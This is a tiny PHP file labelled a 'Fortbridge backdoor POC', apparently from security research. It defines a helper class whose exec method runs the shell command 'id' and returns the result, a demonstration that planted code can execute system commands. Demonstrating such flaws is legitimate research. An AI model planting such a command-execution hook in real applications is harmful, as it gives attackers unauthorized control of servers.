<?php
/**
 * 
 * Fortbridge backdoor POC
 */

class ModHackerHelper
{
    public static function exec($params)
    {
	exec(' id ', $output, $retval);
	return $output;
    }
}
